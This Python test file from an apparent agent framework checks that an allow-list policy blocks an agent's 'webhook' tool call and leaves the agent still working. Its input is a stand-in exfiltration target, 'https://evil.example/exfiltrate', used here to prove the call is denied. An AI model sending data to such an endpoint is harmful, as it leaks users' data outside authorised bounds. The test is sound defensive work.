# ---------------------------------------------------------------
# Copyright (c) Hassan Habib All rights reserved.
# Licensed under the The Standard Software License (TSSL)
# ---------------------------------------------------------------

from datetime import timedelta

from standard_agents.brokers.approvals.not_configured_approval_broker import (
    NotConfiguredApprovalBroker)
from standard_agents.brokers.effects.in_memory_effect_ledger_broker import (
    InMemoryEffectLedgerBroker)
from standard_agents.brokers.policies.allow_list_policy_broker import AllowListPolicyBroker
from standard_agents.brokers.times.system_time_broker import SystemTimeBroker
from standard_agents.models.orchestrations.agents.agent_status import AgentStatus
from standard_agents.services.coordinations.direction.direction_coordination_service import (
    DirectionCoordinationService)
from standard_agents.services.foundations.approvals.approval_service import ApprovalService
from standard_agents.services.foundations.effect_ledgers.effect_ledger_service import (
    EffectLedgerService)
from standard_agents.services.foundations.policies.policy_service import PolicyService
from standard_agents.services.orchestrations.direction.perimeters.perimeter_orchestration_service \
    import PerimeterOrchestrationService


async def test_should_deny_tool_not_in_allow_list_on_act(
        new_execution,
        internal_tool_service,
        external_tool_service,
        logging_broker,
        create_context_with_direction):

    # given
    restricted_service = DirectionCoordinationService(
        perimeter_service=PerimeterOrchestrationService(
            policy_service=PolicyService(
                policy_broker=AllowListPolicyBroker(["calculator"]),
                logging_broker=logging_broker),
            approval_service=ApprovalService(
                approval_broker=NotConfiguredApprovalBroker(),
                logging_broker=logging_broker),
            effect_ledger_service=EffectLedgerService(
                effect_ledger_broker=InMemoryEffectLedgerBroker(),
                time_broker=SystemTimeBroker(),
                logging_broker=logging_broker,
                lease=timedelta(minutes=5)),
            time_broker=SystemTimeBroker(),
            logging_broker=logging_broker),
        execution_service=new_execution(),
        logging_broker=logging_broker)

    input_context = create_context_with_direction(
        "webhook", "https://evil.example/exfiltrate")

    # when
    actual_context = await restricted_service.act(input_context)

    # then
    # The forbidden tool never ran; the agent stays working and can recover.
    assert actual_context.status is AgentStatus.WORKING

    assert sum(
        1 for observation in actual_context.observations
        if "not permitted" in observation) == 1

    assert internal_tool_service.handles.mock_calls == []
    assert internal_tool_service.run.mock_calls == []
    assert external_tool_service.call.mock_calls == []
